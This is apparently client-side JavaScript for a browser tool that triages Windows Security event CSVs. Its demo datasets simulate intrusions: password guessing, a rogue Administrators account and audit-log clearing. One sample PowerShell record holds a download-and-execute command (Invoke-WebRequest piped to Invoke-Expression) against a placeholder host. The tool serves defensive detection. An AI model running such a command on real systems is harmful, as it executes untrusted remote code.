/* All parsing, scoring, and rendering happen in this browser tab. No network APIs are used. */
(() => {
  'use strict';

  const csvHeader = 'Level,Date and Time,Source,Event ID,Task Category,User,Computer,Keywords,Message';
  const sampleRows = {
    normal: [
      ['Information','2026-10-11 09:00:00','Microsoft-Windows-Security-Auditing','4624','Logon','NORTHWIND\\maya','WS-014','Audit Success','Account Name: maya; Logon Type: 2; Workstation Name: WS-014; Source Network Address: -'],
      ['Information','2026-10-11 09:05:00','Microsoft-Windows-Security-Auditing','4688','Process Creation','NORTHWIND\\maya','WS-014','Audit Success','New Process Name: C:\\Windows\\System32\\notepad.exe; Creator Process Name: C:\\Windows\\explorer.exe; Account Name: maya'],
      ['Information','2026-10-11 09:18:00','Microsoft-Windows-Security-Auditing','4624','Logon','NORTHWIND\\opsadmin','SRV-02','Audit Success','Account Name: opsadmin; Logon Type: 10; Workstation Name: SRV-02; Source Network Address: 192.0.2.25'],
      ['Information','2026-10-11 09:20:00','Microsoft-Windows-Security-Auditing','4726','User Account Management','NORTHWIND\\opsadmin','SRV-02','Audit Success','Target Account Name: retired-demo; Subject Account Name: opsadmin']
    ],
    password: [
      ...Array.from({length:6},(_,i)=>['Warning',`2026-10-11 10:0${i}:00`,'Microsoft-Windows-Security-Auditing','4625','Logon','NORTHWIND\\jordan','WS-UNKNOWN','Audit Failure',`Account Name: jordan; Workstation Name: WS-UNKNOWN; Source Network Address: 198.51.100.42; Failure Reason: Unknown user name or bad password`]),
      ['Information','2026-10-11 10:08:00','Microsoft-Windows-Security-Auditing','4624','Logon','NORTHWIND\\jordan','WS-UNKNOWN','Audit Success','Account Name: jordan; Logon Type: 3; Workstation Name: WS-UNKNOWN; Source Network Address: 198.51.100.42']
    ],
    account: [
      ['Information','2026-10-11 11:00:00','Microsoft-Windows-Security-Auditing','4720','User Account Management','NORTHWIND\\itadmin','DC-01','Audit Success','A user account was created. Target Account Name: temp-maint; Subject Account Name: itadmin'],
      ['Information','2026-10-11 11:04:00','Microsoft-Windows-Security-Auditing','4732','Security Group Management','NORTHWIND\\itadmin','DC-01','Audit Success','A member was added to a security-enabled local group. Member Account Name: temp-maint; Group Name: Administrators; Subject Account Name: itadmin']
    ],
    mixed: [
      ...Array.from({length:5},(_,i)=>['Warning',`2026-10-11 12:0${i}:00`,'Microsoft-Windows-Security-Auditing','4625','Logon','NORTHWIND\\alex','WS-UNKNOWN','Audit Failure','Account Name: alex; Workstation Name: WS-UNKNOWN; Source Network Address: 203.0.113.77; Failure Reason: Unknown user name or bad password']),
      ['Information','2026-10-11 12:06:00','Microsoft-Windows-Security-Auditing','4624','Logon','NORTHWIND\\alex','WS-UNKNOWN','Audit Success','Account Name: alex; Logon Type: 3; Workstation Name: WS-UNKNOWN; Source Network Address: 203.0.113.77'],
      ['Information','2026-10-11 12:15:00','Microsoft-Windows-Security-Auditing','4720','User Account Management','NORTHWIND\\alex','DC-01','Audit Success','A user account was created. Target Account Name: svc-cache; Subject Account Name: alex'],
      ['Information','2026-10-11 12:18:00','Microsoft-Windows-Security-Auditing','4732','Security Group Management','NORTHWIND\\alex','DC-01','Audit Success','Member Account Name: svc-cache; Group Name: Administrators; Subject Account Name: alex'],
      ['Warning','2026-10-11 12:30:00','Microsoft-Windows-Security-Auditing','1102','Audit Log','NORTHWIND\\alex','DC-01','Audit Success','The audit log was cleared. Subject Account Name: alex'],
      ['Information','2026-10-11 12:35:00','Service Control Manager','7045','Service Control Manager','SYSTEM','DC-01','Information','A service was installed. Service Name: DemoUpdater; Service File Name: C:\\Program Files\\DemoUpdater\\demo.exe']
    ]
  };
  sampleRows.advanced = [
    ...Array.from({ length: 5 }, (_, i) => ['Warning', '2026-10-15 09:0' + i + ':00', 'Microsoft-Windows-Security-Auditing', '4625', 'Logon', '', 'DC-01', 'Audit Failure', 'Target Account Name: demo-user-' + i + '; Target Account Domain: NORTHWIND; Source Network Address: 198.51.100.50; Logon Type: 3']),
    ['Information', '2026-10-15 09:06:00', 'Microsoft-Windows-Security-Auditing', '4740', 'Account', 'SYSTEM', 'DC-01', 'Audit Success', 'Target Account Name: demo-user-0; Caller Computer Name: LAB-01'],
    ['Information', '2026-10-15 09:07:00', 'Microsoft-Windows-Security-Auditing', '4648', 'Logon', 'NORTHWIND\\maya', 'WS-014', 'Audit Success', 'Target Account Name: demo-admin; Target Server Name: SRV-02; Process Name: C:\\Windows\\System32\\runas.exe'],
    ['Information', '2026-10-15 09:08:00', 'Microsoft-Windows-Security-Auditing', '4688', 'Process', 'NORTHWIND\\maya', 'WS-014', 'Audit Success', 'New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; Creator Process Name: C:\\Program Files\\Microsoft Office\\WINWORD.EXE; Process Command Line: powershell.exe -EncodedCommand RABFAE0ATwA='],
    ['Information', '2026-10-15 09:09:00', 'Microsoft-Windows-PowerShell', '4104', 'Script block', 'NORTHWIND\\maya', 'WS-014', 'Information', 'ScriptBlock ID: fictional-script-001; Script Block Text: Invoke-WebRequest https://example.invalid/demo.txt | Invoke-Expression'],
    ['Information', '2026-10-15 09:10:00', 'Microsoft-Windows-Security-Auditing', '4698', 'Task', 'NORTHWIND\\opsadmin', 'SRV-02', 'Audit Success', 'Task Name: \\DemoMaintenance; Task Content: <Task><Actions><Exec><Command>demo-agent.exe</Command></Exec></Actions></Task>'],
    ['Information', '2026-10-15 09:11:00', 'Microsoft-Windows-Security-Auditing', '4702', 'Task', 'NORTHWIND\\opsadmin', 'SRV-02', 'Audit Success', 'Task Name: \\DemoMaintenance'],
    ['Information', '2026-10-15 09:12:00', 'Microsoft-Windows-Security-Auditing', '4719', 'Audit policy', 'NORTHWIND\\opsadmin', 'DC-01', 'Audit Success', 'Subcategory: Logon; Audit Policy Changes: Failure removed'],
    ['Information', '2026-10-15 09:13:00', 'Microsoft-Windows-Security-Auditing', '4946', 'Firewall', 'SYSTEM', 'SRV-02', 'Audit Success', 'Rule Name: Demo application; Rule ID: fictional-rule-001; Profile Changed: Domain'],
    ['Information', '2026-10-15 09:14:00', 'Microsoft-Windows-Security-Auditing', '4950', 'Firewall', 'SYSTEM', 'SRV-02', 'Audit Success', 'Setting Type: Default outbound action; Setting Value: Allow; Profile Changed: Domain']
  ];
  const sampleNames = { normal: 'Normal Windows Activity', password: 'Password Guessing Scenario', account: 'Account Persistence Scenario', mixed: 'Mixed SOC Scenario', advanced: 'Correlation and Policy Lab' };
  const { parseCsv, normalizeEvents, analyze, normalizeSettings, DEFAULT_SETTINGS, severityOrder, eventSort,
    labelById, eventCatalog, logonTypes, accountDisplay, correlationCoverage } = window.EventTriageAnalysis;
  const ids = ['csv-file','file-name','analyze-button','parse-status','drop-zone','failure-threshold','auth-window','spray-threshold','account-window','reset-settings','report','dataset-tag','summary-banner','coverage-note','metrics','findings','finding-count','top-accounts','top-failures','common-ids','event-search','filter-id','filter-severity','filter-ip','filter-type','event-rows','visible-count','timeline','event-panel','evidence-scope','evidence-title','evidence-back','show-all-events','page-prev','page-next','page-label','event-reference'];
  const els = Object.fromEntries(ids.map(id => [id, document.getElementById(id)]));
  const settingIds = { failureThreshold: 'failure-threshold', authWindowMinutes: 'auth-window', sprayAccountThreshold: 'spray-threshold', accountWindowMinutes: 'account-window' };
  const filterIds = ['event-search','filter-id','filter-severity','filter-ip','filter-type'];
  const PAGE_SIZE = 100;
  let selectedFile = '', currentEvents = [], currentFindings = [], activeEvidenceId = null, page = 0, ingestToken = 0;
  let eventPriorities = new Map(), relatedFindings = new Map();

  const escapeHtml = value => String(value ?? '').replace(/[&<>"']/g, c => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#39;' }[c]));
  const csvEscape = value => '"' + String(value).replaceAll('"', '""') + '"';
  const makeCsv = rows => [csvHeader, ...rows.map(row => row.map(csvEscape).join(','))].join('\r\n');
  const displayTime = event => event.timeText || 'Time unavailable';
  const pairHtml = (label, value) => '<dt>' + escapeHtml(label) + '</dt><dd>' + escapeHtml(value || 'Not available') + '</dd>';
  function setStatus(message, error = false) { els['parse-status'].textContent = message; els['parse-status'].classList.toggle('error', error); }
  function settings() {
    const values = normalizeSettings(Object.fromEntries(Object.entries(settingIds).map(([key, id]) => [key, els[id].value])));
    for (const [key, id] of Object.entries(settingIds)) els[id].value = String(values[key]);
    return values;
  }
  function resetFilters() { for (const id of filterIds) els[id].value = ''; page = 0; }
  function clearLoadedInput(name, message, error = false) {
    selectedFile = name; currentEvents = []; currentFindings = []; activeEvidenceId = null; page = 0;
    els['file-name'].textContent = name; els['analyze-button'].disabled = true; els.report.hidden = true;
    setStatus(message, error);
  }
  function processText(text, name) {
    clearLoadedInput(name, 'Reading CSV…');
    try {
      const result = normalizeEvents(parseCsv(text));
      currentEvents = result.events;
      resetFilters();
      els['analyze-button'].disabled = false;
      const d = result.diagnostics;
      const rows = [...d.blankEventIdRows, ...d.invalidEventIdRows].sort((a,b) => a-b);
      const timestampRows = [...d.ambiguousTimestampRows, ...d.invalidTimestampRows, ...d.missingTimestampRows].sort((a,b) => a-b);
      const describe = values => values.slice(0,8).join(', ') + (values.length > 8 ? ' and ' + (values.length - 8) + ' more' : '');
      const skipped = rows.length ? ' Skipped unreadable Event IDs in CSV row(s) ' + describe(rows) + '.' : '';
      const dates = timestampRows.length ? ' Timestamp review needed in CSV row(s) ' + describe(timestampRows) + '; timed correlations exclude those records.' : '';
      setStatus(d.rowsParsed + ' events parsed.' + skipped + dates + ' Select Analyse events to build the report.');
    } catch (error) { clearLoadedInput(name, error.message || 'Could not parse this CSV.', true); }
  }
  function runAnalysis() {
    if (!currentEvents.length) return;
    currentFindings = analyze(currentEvents, settings());
    if (!currentFindings.some(finding => finding.id === activeEvidenceId)) activeEvidenceId = null;
    eventPriorities = new Map(); relatedFindings = new Map();
    for (const finding of currentFindings) for (const event of finding.events) {
      if (!relatedFindings.has(event.uid)) relatedFindings.set(event.uid, []);
      relatedFindings.get(event.uid).push(finding);
      const previous = eventPriorities.get(event.uid);
      if (!previous || severityOrder[finding.severity] < severityOrder[previous]) eventPriorities.set(event.uid, finding.severity);
    }
    render();
  }
  function render() {
    els.report.hidden = false;
    els['dataset-tag'].textContent = selectedFile || 'UPLOADED DATA';
    const high = currentFindings.filter(finding => finding.severity === 'High').length;
    els['summary-banner'].textContent = currentFindings.length ?
      currentFindings.length + ' findings from ' + currentEvents.length + ' events; ' + high + ' need high-priority review.' :
      'No configured rule fired. Review event coverage and surrounding evidence before reaching a conclusion.';
    const coverage = correlationCoverage(currentEvents);
    els['coverage-note'].textContent = 'Correlation coverage: ' + coverage.authenticationExcluded +
      ' authentication records lack a usable time, target identity, reporting host, or source; ' + coverage.accountChangesExcluded +
      ' account/group records lack a usable time, target identity, or host. These records remain in the event table. Timed matches require timestamps with a time of day and the same timezone basis.' +
      (coverage.incompleteScripts ? ' ' + coverage.incompleteScripts + ' PowerShell records are marked as fragments; complete scripts may require other records.' : '');
    const metrics = [['Total events', currentEvents.length], ['Successful logons', count('4624')], ['Failed logons', count('4625')],
      ['Accounts created', count('4720')], ['Group additions', currentEvents.filter(event => ['4728','4732'].includes(event.id)).length],
      ['Audit-log clearing', count('1102')], ['Process creation', count('4688')], ['Findings to review', currentFindings.length]];
    els.metrics.innerHTML = metrics.map(([label,value]) => '<div class="metric"><span>' + escapeHtml(label) + '</span><strong>' + value + '</strong></div>').join('');
    renderFindings(); renderSnapshots(); renderFilters(); renderTimeline(); renderTable();
  }
  function count(id) { return currentEvents.filter(event => event.id === id).length; }
  function renderFindings() {
    els['finding-count'].textContent = String(currentFindings.length);
    if (!currentFindings.length) {
      els.findings.innerHTML = '<p class="empty-state">No configured rule fired. Check the coverage note and available evidence.</p>';
      return;
    }
    els.findings.innerHTML = currentFindings.map(finding =>
      '<article class="finding-card sev-' + finding.severity.toLowerCase() + '" id="finding-' + finding.id + '" tabindex="-1">' +
      '<div class="finding-top"><h4>' + escapeHtml(finding.title) + '</h4><span class="severity ' + finding.severity.toLowerCase() + '">' + finding.severity + ' review priority</span></div>' +
      '<p class="finding-meta">RULE ' + finding.ruleId + ' · ' + finding.score + ' priority points · ' + finding.events.length + ' supporting event(s)</p>' +
      '<p>' + escapeHtml(finding.why) + '</p>' +
      '<button type="button" class="button button-secondary evidence-button" data-evidence="' + finding.id + '">View ' + finding.events.length + ' supporting event(s)</button>' +
      '<details><summary>Matched fields and score breakdown</summary><dl class="match-fields">' +
      finding.matchedFields.map(item => pairHtml(item.label, item.value)).join('') + '</dl>' +
      '<ul>' + finding.scoreBreakdown.map(item => '<li>+' + item.points + ' · ' + escapeHtml(item.label) + '</li>').join('') +
      '</ul><p>Priority points are assigned per rule. Overlapping findings share evidence and are not added into a dataset risk score.</p></details>' +
      '<details><summary>Benign explanations and investigation steps</summary><p>' + escapeHtml(finding.benign) + '</p><ol>' +
      finding.next.map(step => '<li>' + escapeHtml(step) + '</li>').join('') + '</ol></details></article>'
    ).join('');
  }
  function selectEvidence(id) {
    const finding = currentFindings.find(item => item.id === id);
    if (!finding) return;
    activeEvidenceId = id; resetFilters(); renderTable();
    els['event-panel'].scrollIntoView({ behavior: 'smooth', block: 'start' });
    els['evidence-back'].focus({ preventScroll: true });
  }
  function focusFinding(id) {
    const card = document.getElementById('finding-' + id);
    if (card) { card.scrollIntoView({ behavior: 'smooth', block: 'center' }); card.focus({ preventScroll: true }); }
  }
  function snapshot(id, title, items) {
    els[id].innerHTML = '<div class="snapshot-block"><h4>' + escapeHtml(title) + '</h4>' +
      (items.length ? '<ul>' + items.map(([name,value]) => '<li><span>' + escapeHtml(name) + '</span><strong>' + value + '</strong></li>').join('') + '</ul>' : '<p class="muted small">No data available</p>') + '</div>';
  }
  function renderSnapshots() {
    const accounts = new Map(), failures = new Map(), ids = new Map();
    for (const event of currentEvents) {
      const name = event.account || event.accountSid ? accountDisplay(event) : '';
      if (name) accounts.set(name, (accounts.get(name) || 0) + 1);
      if (name && event.id === '4625') failures.set(name, (failures.get(name) || 0) + 1);
      ids.set(event.id, (ids.get(event.id) || 0) + 1);
    }
    const top = map => [...map].sort((a,b) => b[1]-a[1] || a[0].localeCompare(b[0])).slice(0,5);
    snapshot('top-accounts', 'Top affected accounts', top(accounts));
    snapshot('top-failures', 'Accounts with failed logons', top(failures));
    snapshot('common-ids', 'Most common Event IDs', top(ids).map(([id,value]) => [id + ' · ' + (labelById[id] || 'Other event'), value]));
  }
  function renderFilters() {
    const options = [
      ['filter-id', [...new Set(currentEvents.map(event => event.id))].sort((a,b) => Number(a)-Number(b)), 'All event IDs'],
      ['filter-ip', [...new Set(currentEvents.map(event => event.ip).filter(Boolean))].sort(), 'All source IPs'],
      ['filter-type', [...new Set(currentEvents.map(event => labelById[event.id] || 'Other event'))].sort(), 'All event types']
    ];
    for (const [id, values, label] of options) {
      const previous = els[id].value;
      els[id].innerHTML = '<option value="">' + label + '</option>' + values.map(value =>
        '<option value="' + escapeHtml(value) + '">' + escapeHtml(id === 'filter-id' ? value + ' · ' + (labelById[value] || 'Other event') : value) + '</option>').join('');
      if (values.includes(previous)) els[id].value = previous;
    }
  }
  function eventDetails(event) {
    const pairs = [
      ['Target account', event.account || event.accountSid ? accountDisplay(event) : ''], ['Target SID', event.accountSid], ['Actor', event.actor],
      ['Reporting host', event.computer], ['Source IP', event.ip], ['Workstation / caller', event.workstation],
      ['Timestamp interpretation', event.timestampStatus + (event.hasTime ? '' : '; no time of day')],
      ['Windows event level', event.level], ['Provider', event.source],
      ['Logon type', event.logonType ? event.logonType + ' · ' + (logonTypes[event.logonType] || 'Other logon type') : ''],
      ['New process path', event.process], ['Creator process path', event.parent], ['Process ID', event.processId], ['Command line', event.command],
      ['Group', event.group], ['Group SID', event.groupSid], ['Service name', event.serviceName], ['Service image', event.servicePath],
      ['Script block ID', event.scriptBlockId], ['Script fragment', event.scriptFragmentTotal ? (event.scriptFragment || '?') + ' of ' + event.scriptFragmentTotal : ''],
      ['Task name', event.taskName], ['Task content', event.taskContent], ['Credential target server', event.targetServer],
      ['Audit subcategory', event.subcategory], ['Audit changes', event.policyChanges],
      ['Firewall rule', event.firewallRule || event.firewallRuleId], ['Firewall profile', event.firewallProfile],
      ['Firewall setting', event.firewallSetting], ['Firewall value', event.firewallValue]
    ].filter(([,value]) => value);
    const links = (relatedFindings.get(event.uid) || []).map(finding => '<button type="button" class="button button-quiet" data-finding-focus="' + finding.id + '">Back to ' + escapeHtml(finding.title) + '</button>').join('');
    return '<details class="event-details"><summary>Inspect CSV row ' + event.lineNumber + '</summary><dl class="match-fields">' +
      pairs.map(([label,value]) => pairHtml(label,value)).join('') + '</dl><h4>Original event message</h4><pre>' + escapeHtml(event.message || 'No Message column value') +
      '</pre><details><summary>All original CSV columns</summary><dl class="match-fields">' +
      event.rawFields.map(item => pairHtml(item.header,item.value)).join('') + '</dl></details>' + links + '</details>';
  }
  function renderTable() {
    const finding = currentFindings.find(item => item.id === activeEvidenceId);
    const scope = finding ? new Set(finding.events.map(event => event.uid)) : null;
    els['evidence-scope'].hidden = !finding;
    els['evidence-title'].textContent = finding ? 'Supporting evidence for ' + finding.title + ' · ' + finding.ruleId + ' · ' + finding.events.length + ' event(s)' : '';
    const search = els['event-search'].value.trim().toLowerCase();
    const filtered = currentEvents.filter(event => {
      const priority = eventPriorities.get(event.uid) || 'Informational';
      const hay = ((labelById[event.id] || '') + ' ' + event.rawFields.map(item => item.value).join(' ')).toLowerCase();
      return (!scope || scope.has(event.uid)) && (!search || hay.includes(search)) &&
        (!els['filter-id'].value || event.id === els['filter-id'].value) &&
        (!els['filter-severity'].value || priority === els['filter-severity'].value) &&
        (!els['filter-ip'].value || event.ip === els['filter-ip'].value) &&
        (!els['filter-type'].value || (labelById[event.id] || 'Other event') === els['filter-type'].value);
    });
    page = Math.max(0, Math.min(page, Math.ceil(filtered.length / PAGE_SIZE) - 1));
    const shown = filtered.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);
    els['visible-count'].textContent = filtered.length + ' matching events' + (finding ? ' in finding evidence' : ' of ' + currentEvents.length);
    els['page-label'].textContent = filtered.length ? 'Rows ' + (page * PAGE_SIZE + 1) + '–' + (page * PAGE_SIZE + shown.length) + ' of ' + filtered.length : 'No matching events';
    els['page-prev'].disabled = page === 0; els['page-next'].disabled = (page + 1) * PAGE_SIZE >= filtered.length;
    els['event-rows'].innerHTML = shown.length ? shown.map(event => {
      const priority = eventPriorities.get(event.uid) || 'Informational';
      const summary = [labelById[event.id] || 'Other event', event.logonType ? 'Logon type ' + event.logonType + ' (' + (logonTypes[event.logonType] || 'Other') + ')' : '',
        event.process, event.serviceName, event.taskName, event.firewallRule].filter(Boolean).join(' · ');
      return '<tr data-event-uid="' + event.uid + '"><td>' + escapeHtml(displayTime(event)) + '<br>CSV row ' + event.lineNumber +
        '</td><td>' + event.id + '</td><td><span class="severity ' + priority.toLowerCase() + '">' + priority +
        '</span></td><td>' + escapeHtml(event.account || event.accountSid ? accountDisplay(event) : '—') + '</td><td>' +
        escapeHtml(event.ip || event.computer || '—') + '</td><td class="event-message">' + escapeHtml(summary) + eventDetails(event) + '</td></tr>';
    }).join('') : '<tr><td colspan="6" class="table-empty">No events match these filters.</td></tr>';
  }
  function renderTimeline() {
    const noteworthy = [...new Map(currentFindings.flatMap(finding => finding.events).map(event => [event.uid,event])).values()].sort(eventSort);
    els.timeline.innerHTML = noteworthy.length ? noteworthy.map(event => '<li><time>' + escapeHtml(displayTime(event)) +
      (event.date ? '' : ' · unparsed time; ordered by CSV row') + '</time><strong>' + escapeHtml(labelById[event.id] || 'Other event') +
      '</strong> · CSV row ' + event.lineNumber + ' · ' + escapeHtml(event.account || event.accountSid ? accountDisplay(event) : event.computer || 'Unknown host') + '</li>').join('') :
      '<li>No noteworthy activity generated by configured rules.</li>';
  }

  els['analyze-button'].addEventListener('click', () => {
    runAnalysis(); els.report.scrollIntoView({ behavior: 'smooth', block: 'start' }); setStatus('Triage report ready. Check the correlation coverage note.');
  });
  els['csv-file'].addEventListener('change', async event => {
    const file = event.target.files?.[0]; if (!file) return;
    const token = ++ingestToken;
    clearLoadedInput(file.name, 'Reading CSV…');
    if (!file.name.toLowerCase().endsWith('.csv')) { setStatus('Please choose a file with a .csv extension.', true); return; }
    if (file.size > 25 * 1024 * 1024) { setStatus('File exceeds 25 MB. Export a smaller time range.', true); return; }
    try { const text = await file.text(); if (token === ingestToken) processText(text,file.name); }
    catch { if (token === ingestToken) setStatus('This file could not be read.', true); }
  });
  document.querySelectorAll('[data-sample]').forEach(button => button.addEventListener('click', () => {
    ingestToken += 1; const key = button.dataset.sample;
    processText(makeCsv(sampleRows[key]),sampleNames[key] + ' · Demo Data'); document.querySelector('.demo-details').open = true;
  }));
  for (const id of filterIds) els[id].addEventListener('input', () => { page = 0; renderTable(); });
  for (const id of Object.values(settingIds)) els[id].addEventListener('change', () => { settings(); if (!els.report.hidden) runAnalysis(); });
  els['reset-settings'].addEventListener('click', () => {
    for (const [key,id] of Object.entries(settingIds)) els[id].value = String(DEFAULT_SETTINGS[key]);
    if (!els.report.hidden) runAnalysis();
  });
  els.findings.addEventListener('click', event => { const button = event.target.closest('[data-evidence]'); if (button) selectEvidence(button.dataset.evidence); });
  els['event-rows'].addEventListener('click', event => { const button = event.target.closest('[data-finding-focus]'); if (button) focusFinding(button.dataset.findingFocus); });
  els['evidence-back'].addEventListener('click', () => focusFinding(activeEvidenceId));
  els['show-all-events'].addEventListener('click', () => { activeEvidenceId = null; resetFilters(); renderTable(); });
  els['page-prev'].addEventListener('click', () => { page -= 1; renderTable(); });
  els['page-next'].addEventListener('click', () => { page += 1; renderTable(); });
  const zone = els['drop-zone'];
  for (const type of ['dragenter','dragover']) zone.addEventListener(type, event => { event.preventDefault(); zone.classList.add('dragover'); });
  for (const type of ['dragleave','drop']) zone.addEventListener(type, event => { event.preventDefault(); zone.classList.remove('dragover'); });
  zone.addEventListener('drop', event => {
    const file = event.dataTransfer.files?.[0]; if (!file) return;
    const transfer = new DataTransfer(); transfer.items.add(file); els['csv-file'].files = transfer.files;
    els['csv-file'].dispatchEvent(new Event('change', { bubbles: true }));
  });
  els['event-reference'].innerHTML = Object.entries(eventCatalog).map(([id,info]) =>
    '<div><dt>' + id + '</dt><dd>' + escapeHtml(info.label) + '<details><summary>Logging and required context</summary><p>' +
    escapeHtml(info.channel) + ' · ' + escapeHtml(info.audit) + '</p><p>' + escapeHtml(info.fields) + '</p></details></dd></div>').join('');
})();

